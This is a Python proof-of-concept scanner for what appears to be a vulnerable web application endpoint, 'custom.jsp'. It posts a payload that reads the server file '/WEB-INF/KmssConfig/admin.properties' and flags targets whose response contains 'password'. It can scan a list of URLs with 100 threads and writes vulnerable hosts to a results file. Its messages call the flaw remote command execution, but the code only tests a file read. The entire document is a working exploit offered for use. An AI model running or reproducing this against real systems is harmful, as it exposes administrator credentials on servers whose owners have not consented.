import requests,argparse,sys,requests_raw
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def poc(target):
    header = {
        "User-Agent": "Go-http-client/1.1",
        "Content-Length": "64",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
    }

    data = {
        "var": '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    }
    url = target+'/sys/ui/extend/varkind/custom.jsp'
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests.post(url=url,headers=header,data=data,verify=False,timeout=5)
        if 'password' in rsp2.text:
            print(f'[+]{target}存在远程命令执行')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在远程命令执行')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()